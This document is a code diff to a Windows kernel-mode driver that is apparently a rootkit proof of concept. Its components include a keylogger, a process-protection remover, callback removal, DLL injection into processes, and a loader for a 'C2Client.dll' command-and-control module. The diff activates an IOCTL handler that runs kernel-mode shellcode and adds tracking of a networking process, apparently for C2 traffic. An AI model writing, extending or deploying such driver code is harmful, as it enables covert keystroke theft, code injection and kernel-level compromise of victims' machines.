@@ -11,7 +11,7 @@
 
 Globals g_Globals = { 0 };
 
-constexpr CHAR* NETWORKING_DLL_PATH = "..\\C2Client.dll";
+constexpr CHAR* NETWORKING_DLL_PATH = "C:\\Users\\dol12\\Desktop\\Poc\\C2Client.dll";
 
 extern "C"
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
@@ -91,7 +91,6 @@ void DriverUnload(PDRIVER_OBJECT DriverObject) {
 	UNICODE_STRING symlinkName = RTL_CONSTANT_STRING(SYMLINK_NAME);
 
 	delete g_Globals.Keylogger;
-	delete g_Globals.HookManager;
 	delete g_Globals.ProtectionRemover;
 	delete g_Globals.ModuleFinder;
 
@@ -139,6 +138,7 @@ NTSTATUS IoctlDispatch(PDEVICE_OBJECT, PIRP Irp) {
 		status = HandleRestoreProtection(Irp, currentStackLocation);
 		break;
 	case IOCTL_RUN_KM_SHELLCODE:
+		status = HandleRunKmShellcode(Irp, currentStackLocation);
 		break;
 	default:
 		LOG_FAIL_VA("Received unsupported ioctl %ul", ioctlParameters.IoControlCode);
@@ -205,7 +205,8 @@ NTSTATUS HandleRemoveCallacks(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation)
 NTSTATUS HandleInjectLibraryToProcess(PIRP Irp, IO_STACK_LOCATION* CurrentStackLocation) {
 	LOG_SUCCESS(STRINGIFY(IOCTL_START_KEYLOGGING) " called");
 	Irp->IoStatus.Information = 0;
-	auto* params = Utils::ValidateAnysizeInput<InjectLibraryParams, CHAR>(Irp, CurrentStackLocation, FIELD_OFFSET(InjectLibraryParams, DllPath));
+	auto* params = Utils::ValidateAnysizeInput<InjectLibraryParams, CHAR>(Irp, CurrentStackLocation, \
+		FIELD_OFFSET(InjectLibraryParams, DllPath));
 	if (params == nullptr) {
 		return STATUS_BUFFER_TOO_SMALL;
 	}
@@ -336,12 +337,15 @@ NTSTATUS CompleteIrp(PIRP Irp, NTSTATUS Status, ULONG_PTR Information) {
 void OnCreateProcess(HANDLE, HANDLE ProcessId, BOOLEAN IsCreated)
 {
 	if (!IsCreated) return;
+	if (g_Globals.Network.Pid != 0) return;
+
 	PEPROCESS process;
 	::PsLookupProcessByProcessId(ProcessId, &process);
 	PUNICODE_STRING imageName = nullptr;
 	::SeLocateProcessImageName(process, &imageName);
+	LOG_SUCCESS_VA("Process %ws created", imageName->Buffer);
 	UNICODE_STRING expectedImageNamePattern = RTL_CONSTANT_STRING(L"*" NETWORKING_PROCESS);
-	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, FALSE, nullptr)) {
+	if (::FsRtlIsNameInExpression(&expectedImageNamePattern, imageName, TRUE, nullptr)) {
 		LOG_SUCCESS_VA("Found matching process, pid=%04x", ::HandleToUlong(ProcessId));
 		g_Globals.Network.Pid = ProcessId;
 	}
